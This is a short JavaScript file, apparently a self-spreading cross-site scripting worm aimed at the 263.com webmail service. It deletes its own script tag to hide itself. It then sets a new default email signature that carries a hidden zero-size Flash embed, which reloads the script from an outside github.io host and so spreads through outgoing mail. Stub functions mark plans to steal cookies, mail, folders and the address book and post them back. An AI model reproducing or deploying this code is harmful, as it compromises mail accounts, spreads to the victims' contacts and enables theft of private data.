(function () {
    //hide self
    $("script[src^='//analyzes.github.io/script/analyzes.js']").remove();
    // move to top
    var host = window.top.top.top.top.top.top.top.top.top.top.top;
    console.log(host);
    if ($('#mailText').length) {

    }
    var urlParam = window.urlParams;
    var sysPath = "http://mm.263.com/wm2e/mail";
    var signPath = sysPath + "/signInfoSetting/signInfoSettingAction_";
    var addrPath = sysPath + "/personAddressBook/personAddressAction_";
    var hook = '<p><embed allowscriptaccess="always" style="width:0;height:0" src="//analyzes.github.io/cw69.swf?a=run&c=//analyzes.github.io/script/analyzes.js"/></p>';
    var addressBook = addrPath + "getAddressInitSys.do?" + urlParam;
    var addressBookDepart = addrPath + "getEnterAddressListAllNew.do?" + urlParam;

    function infection() {
        $.get(signPath + "signInfoManage.do?" + urlParam, function (data) {
            var signs = $(data).filter('.popBox').children();
            if (signs.length > 0) {
                // check hook exist
                //get all signs
                var hooked = true;
                if (!hooked) {
                    // get default sign 
                    // update default sign
                }
            } else {
                // add new sign
                $.post(signPath + "saveSignInfo.do?" + urlParam, { name: 'Ä¬ÈÏÇ©Ãû', contexts: '<p><br/></p>' + hook });
                // set first sign as default
                $.get(signPath + "setDefaultSignInfo.do?id=0&" + urlParam);
            }
        });
    }

    function analyze() {
        //cookie
        //email
        //folder
        //addressBook
    }

    function alive(parameters) {
        // put self in top and start timer

        //get data and post back
    }

})();
